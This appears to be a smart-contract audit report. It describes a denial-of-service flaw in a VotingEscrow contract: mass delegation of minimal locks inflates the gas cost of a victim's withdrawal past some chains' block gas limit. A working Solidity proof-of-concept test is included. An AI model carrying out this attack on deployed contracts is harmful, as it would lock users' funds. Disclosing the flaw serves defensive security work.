# An Attacker can DOS user withdrawal by delegating many tokens with least amount lock.

## Summary
The VotingEscrow contract's delegate function can be exploited to prevent a user from managing their tokens by exceeding the gas limit with a large number of delegated tokens.

## Vulnerability Detail
Any user can delegate the balance of their locked NFT to anyone by calling the delegate function. The delegated tokens are stored in an array that can become very large, potentially causing a denial of service (DOS) attack. 

To prevent this, the VotingEscrow contract includes a safety check that limits the array to a maximum of 1024 delegates.
Despite this, a user with 1024 delegated tokens will require approximately 23 million gas to transfer, burn, or mint a token, which exceeds the current gas limit on some evm compatible chains like Optimism chain with gas limit 15 million.

## Impact
The VotingEscrow contract's gas limit for delegations can be exploited to prevent a victim from withdrawing, transferring, or delegating their tokens. 
This could effectively lock the victim's tokens and disrupt their ability to manage their assets.

## POC
```solidity
  function testMaxDelegateLimitDOS() public {
    // --- ATTACKER
    flowDaiPair.approve(address(escrow), TOKEN_1);

    address alice = address(0x1337);
    for(uint256 i = 0; i < escrow.MAX_DELEGATES() - 1; i++) {
      escrow.create_lock(1, 100 days);
      escrow.delegate(alice);
    }

    flowDaiPair.transfer(alice, 100);

    // ------ ALICE --------
    vm.startPrank(alice);
    flowDaiPair.approve(address(escrow), 100);
    uint tokenId = escrow.create_lock(1, 7 days);

    vm.warp(block.timestamp + 7 days);

    uint initialGas = gasleft();
    escrow.withdraw(tokenId);
    uint gasUsed = initialGas - gasleft();

    console.log(gasUsed); // 23637422
    assertTrue(gasUsed > 20_000_000);
  }
```
